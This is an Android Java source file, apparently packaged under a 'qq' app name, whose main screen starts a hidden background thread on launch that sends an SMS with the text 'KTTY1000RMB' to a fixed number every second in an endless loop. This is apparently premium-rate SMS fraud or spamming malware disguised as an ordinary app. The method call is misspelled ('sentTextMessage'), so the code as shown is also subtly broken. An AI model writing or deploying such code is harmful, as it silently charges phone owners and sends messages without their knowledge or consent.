package com.HUAT.qq;

import android.support.v7.app.ActionBarActivity;
import android.telephony.gsm.SmsManager;
import android.os.Bundle;
import android.os.SystemClock;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;

public class MainActivity extends ActionBarActivity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		//去除标题，必须在setContentView方法前调用
		requestWindowFeature(Window.FEATURE_NO_TITLE);	//去除标题
		
		setContentView(R.layout.activity_main);
		
		//开启一个子线程，while(true)循环发送短信
		new Thread(new Runnable(){

			@Override
			public void run() {
				// TODO Auto-generated method stub
				//循环发送短信
				
				while(true){
					
					//Thread.sleep(1000);
					
					SystemClock.sleep(1000);
					
					SmsManager smsManager = SmsManager.getDefault();	//短信管理器
					smsManager.sentTextMessage(
							"10065888837",	//收件人的号码
							null,	//短信中心号码
							"KTTY1000RMB",
							null,	//如果发送成功，回调广播，通知我们
							null	//当对方接受成功，回调此广播
							);
				}
			}
			
		}).start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
